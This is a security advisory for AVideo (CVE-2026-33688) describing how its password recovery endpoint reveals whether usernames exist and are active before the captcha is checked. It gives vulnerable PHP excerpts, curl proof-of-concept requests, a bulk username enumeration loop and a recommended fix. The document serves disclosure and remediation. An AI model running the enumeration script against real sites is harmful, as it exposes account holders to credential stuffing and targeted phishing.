# [M] AVideo has Pre-Captcha User Enumeration and Account Status Disclosure in Password Recovery Endpoint

## Summary
Severity: Medium
Advisory: GHSA-m99f-mmvg-3xmx
CVE: CVE-2026-33688
CWE: CWE-204
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-m99f-mmvg-3xmx
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The password recovery endpoint at `objects/userRecoverPass.php` performs user existence and account status checks **before** validating the captcha. This allows an unauthenticated attacker to enumerate valid usernames and determine whether accounts are active, inactive, or banned — at scale and without solving any captcha — by observing three distinct JSON error responses.

## Details

In `objects/userRecoverPass.php`, the request flow is:

1. **Line 11** — A `User` object is instantiated from unsanitized `$_REQUEST['user']` with no authentication:
```php
$user = new User(0, $_REQUEST['user'], false);
```

2. **Lines 27-29** — If the user does not exist, a distinct error is returned immediately:
```php
if (empty($user->getStatus())) {
    $obj->error = __("User not found");
    die(json_encode($obj));
}
```

3. **Lines 31-33** — If the user exists but is not active, a different distinct error is returned:
```php
if ($user->getStatus() !== 'a') {
    $obj->error = __("The user is not active");
    die(json_encode($obj));
}
```

4. **Lines 37-41** — Captcha validation only occurs **after** both user enumeration checks:
```php
if (empty($_REQUEST['captcha'])) {
    $obj->error = __("Captcha is empty");
} else {
    require_once 'captcha.php';
    $valid = Captcha::validation($_REQUEST['captcha']);
```

This ordering creates a reliable oracle: requests that hit the captcha check confirm the user exists and is active, while the two earlier error messages reveal non-existence or inactive status — all without requiring a valid captcha.

By contrast, the registration endpoint (`objects/userCreate.json.php`) correctly validates the captcha at lines 32-42 **before** performing any user existence checks, confirming this ordering in the password recovery endpoint is a bug.

No rate limiting (`rateLimitByIP`) or brute force protection (`bruteForceBlock`) is applied to this endpoint. The framework's session-based DDOS protection is trivially bypassed by omitting cookies (each request gets a fresh session).

## PoC

```bash
# 1. Test a non-existent user — returns "User not found" without captcha
curl -s -X POST 'http://localhost/AVideo/objects/userRecoverPass.php' \
  -d 'user=nonexistent_user_xyz&captcha=' | jq .error
# Response: "User not found"

# 2. Test a valid active user — passes user checks, hits captcha validation
curl -s -X POST 'http://localhost/AVideo/objects/userRecoverPass.php' \
  -d 'user=admin&captcha=' | jq .error
# Response: "Captcha is empty"

# 3. Test an inactive/banned user (if one exists) — returns distinct status message
curl -s -X POST 'http://localhost/AVideo/objects/userRecoverPass.php' \
  -d 'user=banned_user&captcha=' | jq .error
# Response: "The user is not active"

# 4. Bulk enumeration script — no captcha solving required
for user in admin root test user1 user2 moderator editor; do
  result=$(curl -s -X POST 'http://localhost/AVideo/objects/userRecoverPass.php' \
    -d "user=${user}&captcha=")
  error=$(echo "$result" | jq -r .error)
  if [ "$error" = "Captcha is empty" ]; then
    echo "[ACTIVE] $user"
  elif [ "$error" = "The user is not active" ]; then
    echo "[INACTIVE] $user"
  else
    echo "[NOT FOUND] $user"
  fi
done
```

## Impact

- **Username enumeration**: Attackers can determine which usernames are registered on the platform without any captcha or authentication barrier.
- **Account status disclosure**: Attackers can distinguish between active, inactive, and non-existent accounts, revealing moderation/ban status.
- **Credential stuffing enablement**: Confirmed valid usernames can be used in targeted password brute-force or credential stuffing attacks against the login endpoint.
- **Phishing**: Knowledge of valid active accounts enables targeted social engineering attacks against real users.
- **No throttling**: The absence of rate limiting on this endpoint allows high-speed automated enumeration.

## Recommended Fix

Move the captcha validation before the user existence checks, and return a generic message regardless of user status:

```php
// In objects/userRecoverPass.php, replace lines 26-41 with:

    header('Content-Type: application/json');

    // Validate captcha FIRST, before any user lookups
    if (empty($_REQUEST['captcha'])) {
        $obj->error = __("Captcha is empty");
        die(json_encode($obj));
    }
    require_once 'captcha.php';
    $valid = Captcha::validation($_REQUEST['captcha']);
    if (!$valid) {
        $obj->error = __("Your code is not valid");
        $obj->reloadCaptcha = true;
        die(json_encode($obj));
    }

    // After captcha passes, check user — but use generic message
    if (empty($user->getStatus()) || $user->getStatus() !== 'a' || empty($user->getEmail())) {
        // Generic message — do not reveal whether user exists or is active
        $obj->success = __("If this account exists, a recovery email has been sent");
        die(json_encode($obj));
    }

    // Proceed with actual password recovery...
    $recoverPass = $user->setRecoverPass();
```

Additionally, consider adding `rateLimitByIP()` to this endpoint as defense-in-depth.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-m99f-mmvg-3xmx
- https://nvd.nist.gov/vuln/detail/CVE-2026-33688
- https://github.com/WWBN/AVideo/commit/e42f54123b460fd1b2ee01f2ce3d4a386e88d157
- https://github.com/WWBN/AVideo
